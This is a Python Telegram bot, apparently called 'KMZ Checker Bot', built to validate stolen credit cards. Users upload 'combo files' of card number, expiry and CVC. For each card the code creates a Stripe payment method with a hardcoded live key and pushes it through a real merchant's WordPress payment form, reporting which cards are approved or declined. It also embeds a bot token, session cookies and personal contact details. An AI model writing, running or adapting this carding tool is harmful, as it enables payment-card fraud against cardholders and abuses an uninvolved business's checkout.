import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackContext, filters
import requests
import time
import pyfiglet
from colorama import Fore, Back, Style
from flask import Flask, request, jsonify
import os

async def start(update: Update, context: CallbackContext) -> None:
    """Send welcome message"""
    user = update.effective_user
    await update.message.reply_text(
        f'Hi {user.first_name}! Welcome to KMZ Checker Bot\n\n'
        'Send me a combo file (text file with CC details) to start checking.'
    )

async def handle_document(update: Update, context: CallbackContext) -> None:
    """Handle received combo file"""
    file = await update.message.document.get_file()
    await file.download_to_drive('combo.txt')
    
    if 'token' not in context.user_data:
        await update.message.reply_text('Please send your Telegram bot token:')
        return
    if 'chat_id' not in context.user_data:
        await update.message.reply_text('Please send your Telegram chat ID:')
        return
    
    await process_combo(update, context, 'combo.txt')

async def handle_text(update: Update, context: CallbackContext) -> None:
    """Handle text messages"""
    text = update.message.text
    
    if 'token' not in context.user_data:
        context.user_data['token'] = text
        await update.message.reply_text('Token saved. Now please send your chat ID:')
        return
    
    if 'chat_id' not in context.user_data:
        context.user_data['chat_id'] = text
        await update.message.reply_text('Chat ID saved. Now please send your combo file (as document):')

async def help_command(update: Update, context: CallbackContext) -> None:
    """Send help message"""
    await update.message.reply_text(
        'Help: Send me a combo file (text file) with CC details in format:\n'
        'cardnumber|mm|yy|cvc'
    )

# Configuration
TOKEN = os.getenv('TELEGRAM_TOKEN', '7481791551:AAETR-MWhG8wQJmmh5ZKScEg8msOQmAgcbc')
WEBHOOK_URL = os.getenv('WEBHOOK_URL')  # Will be set in Render.com environment variables
PORT = int(os.getenv('PORT', 5000))

# Initialize Telegram application
application = Application.builder().token(TOKEN).build()

# Add handlers
application.add_handler(CommandHandler("start", start))
application.add_handler(CommandHandler("help", help_command))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

# Flask app setup
app = Flask(__name__)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
    level=logging.INFO
)
logger = logging.getLogger(__name__)

async def process_combo(update: Update, context: CallbackContext, combo_file: str):
    """Process the combo file"""
    await update.message.reply_text('Starting to check cards...')
    
    token = context.user_data['token']
    chat_id = context.user_data['chat_id']
    start_num = 0
    
    with open(combo_file, 'r') as file:
        for P in file.readlines():
            start_num += 1
            try:
                n, mm, yy, cvc = P.split('|')[:4]
                yy = yy[-2:]
                cvc = cvc.strip()

                time.sleep(10)
                
                headers = {
                    'authority': 'api.stripe.com',
                    'accept': 'application/json',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                }

                data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_9sEidmFcTHYDfhGn3zZYH1wG00ZmolhPCV'

                r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
                
                try:
                    pm = r1.json()['id']
                    await update.message.reply_text(pm)
                    
                except:
                    er = r1.json()['error']['message']
                    if 'Your card number is incorrect.' in r1.text:
                        await update.message.reply_text(f'[ {start_num} ] {P} ➠➠ Incorrect Number ❌')
                        continue
                    else:
                        await update.message.reply_text(er)
                        continue
                
                time.sleep(10)

                cookies = {
                    '__stripe_mid': 'f7a7e7f3-c831-4eaf-a364-fbacd00d6c389f0a20',
                    '__stripe_sid': 'd6517667-6ed3-4204-9cf8-d7e57068b85bdf3398',
                }

                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://fpsurveying.co.uk',
                    'priority': 'u=1, i',
                    'referer': 'https://fpsurveying.co.uk/book/homebuyer-instruction-august-old/',
                    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

                params = {'t': '1744088280834'}

                data = { 
                    'data': 'ak_hp_textarea=&ak_js=1744088213874&__fluent_form_embded_post_id=2843&_fluentform_44_fluentformnonce=94b1c99d45&_wp_http_referer=%2Fbook%2Fhomebuyer-instruction-august-old%2F&names%5Bfirst_name%5D=yr&names%5Blast_name%5D=hj%20kj&email=kmzmyanmar2%40gmail.com&phone=09986075167&address_2%5Baddress_line_1%5D=JO%20hai%2C%20ks&address_2%5Bcity%5D=tamu&address_2%5Bstate%5D=myanmar&address_2%5Bzip%5D=22322&address_1%5Baddress_line_1%5D=kmz%20tam.sj%2C%2Csk&address_1%5Bcity%5D=tamu&address_1%5Bstate%5D=myanmar&address_1%5Bzip%5D=22322&input_text=Ye%20Htut%20Naing&input_text_6=1&input_text_1=09986075167&payment_method=stripe&terms-n-condition=on&input_text_4=&input_text_5=&payment_input_1=349&hidden=349&alt_s=&tawzrb469=554294&ak_bib=1744088220895&ak_bfs=1744088273995&ak_bkpc=36&ak_bkp=7%3B3%3B132%3B142%2C86%3B169%2C27%3B126%2C99%3B109%2C117%3B207%2C21%3B100%2C122%3B140%2C82%3B148%2C119%3B138%2C86%3B1059%2C190%3B140%2C386%3B141%2C117%3B171%2C136%3B143%2C2%3B150%2C62%3B126%2C200%3B169%2C14%3B153%2C111%3B105%2C79%3B1%3B2%3B1%3B2%3B3%3B1%3B2%3B2%3B2%3B2%3B2%3B1%3B128%2C161%3B359%2C53%3B&ak_bmc=11%3B5%2C1084%3B8%2C1363%3B8%2C976%3B0%2C678%3B0%2C1091%3B9%2C5930%3B8%2C1442%3B8%2C1868%3B8%2C2890%3B9%2C1206%3B6%2C1906%3B9%2C1186%3B7%2C1093%3B8%2C1363%3B9%2C1820%3B11%2C1192%3B6%2C1479%3B11%2C2038%3B3%2C14429%3B19%2C10039%3B&ak_bmcc=21&ak_bmk=11%3B11%3B34&ak_bck=&ak_bmmc=0&ak_btmc=9&ak_bsc=9&ak_bte=228%3B148%2C616%3B88%2C279%3B495%2C262%3B39%2C743%3B29%2C1065%3B49%2C1320%3B46%2C938%3B47%2C638%3B70%2C1022%3B77%2C5852%3B40%2C1412%3B236%2C1151%3B50%2C439%3B49%2C2849%3B69%2C1145%3B266%2C1211%3B31%2C408%3B29%2C1162%3B29%2C1073%3B55%2C1311%3B286%2C1069%3B49%2C428%3B19%2C1182%3B281%2C874%3B38%2C296%3B210%2C1549%3B57%2C229%3B318%2C13319%3B57%2C746%3B594%2C6040%3B256%2C329%3B305%2C331%3B229%2C319%3B219%2C943%3B119%2C356%3B&ak_btec=36&ak_bmm=&payment_input%5B%5D=&__stripe_payment_method_id='+str(pm),
                    'action': 'fluentform_submit',
                    'form_id': '44',
                }

                r2 = requests.post(
                    'https://fpsurveying.co.uk/wp-admin/admin-ajax.php',
                    params=params,
                    cookies=cookies,
                    headers=headers,
                    data=data,
                )
                await update.message.reply_text(r2.text)
                
                if "Your card was declined" in r2.text:
                    msg = f'''✘ Declined 
✘ CC ➠ {P}
✘ Result ➠ Declined ❌
✘ Gateway ➠ Stripe Auth
━━━━━━━━━━━━━━━━━  
✘ By ➠ KMZ BOT'''
                    await update.message.reply_text(msg)
                    await send_telegram_alert(token, chat_id, msg)
                
                else:
                    await update.message.reply_text(f'[ {start_num} ] {P} ➠➠ Approved ✅')

            except Exception as e:
                await update.message.reply_text(f'Error processing line {start_num}: {str(e)}')
                continue

async def send_telegram_alert(token: str, chat_id: str, message: str):
    """Send alert to Telegram"""
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}"
    requests.post(url)



@app.route('/webhook', methods=['POST'])
async def webhook():
    """Handle incoming Telegram updates via webhook"""
    if request.method == "POST":
        update = Update.de_json(request.get_json(force=True), application.bot)
        await application.process_update(update)
        return jsonify(success=True)
    return jsonify(success=False)

@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    """Set Telegram webhook"""
    if not WEBHOOK_URL:
        return "WEBHOOK_URL not configured", 400
    
    url = f"{WEBHOOK_URL}/webhook"
    application.bot.set_webhook(url)
    return f"Webhook set to {url}", 200

@app.route('/')
def index():
    """Health check endpoint"""
    return "KMZ Bot is running", 200

if __name__ == '__main__':
    # For local testing
    if os.getenv('ENVIRONMENT') == 'development':
        application.run_polling()
    else:
        # For production with Gunicorn
        from threading import Thread
        Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': PORT}).start()
